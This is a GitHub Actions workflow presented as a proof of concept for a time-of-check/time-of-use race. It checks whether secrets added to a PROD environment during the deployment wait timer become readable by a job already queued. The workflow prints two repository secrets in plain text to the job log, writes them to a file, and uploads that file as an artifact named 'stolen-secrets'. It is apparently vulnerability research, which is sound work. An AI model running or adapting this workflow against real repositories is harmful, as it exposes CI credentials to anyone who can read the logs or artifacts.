name: Secret Race Condition Test
on:
  workflow_dispatch:
    inputs:
      reason:
        description: "Manual trigger reason"
        required: false
  repository_dispatch:
    types: [poc-run]

jobs:
  deploy-to-prod:
    runs-on: ubuntu-latest
    environment: PROD  # THIS triggers the 2-minute wait timer!
    steps:
      - name: Read secrets after wait timer completes
        env:
          EXISTING_SECRET: ${{ secrets.EXISTING_SECRET }}
          BRAND_NEW_SECRET: ${{ secrets.BRAND_NEW_SECRET }}
        run: |
          echo "=== TOCTOU Secret Race PoC ==="
          echo "If secrets were added DURING the wait timer,"
          echo "they should appear here (vulnerability)."
          echo ""
          echo "EXISTING_SECRET: ${EXISTING_SECRET:-<not set>}"
          echo "BRAND_NEW_SECRET: ${BRAND_NEW_SECRET:-<not set>}"
          
          mkdir -p out
          cat > out/secrets.txt <<EOT
          EXISTING_SECRET=${EXISTING_SECRET}
          BRAND_NEW_SECRET=${BRAND_NEW_SECRET}
          EOT
          
      - uses: actions/upload-artifact@v4
        with:
          name: stolen-secrets
          path: out/secrets.txt
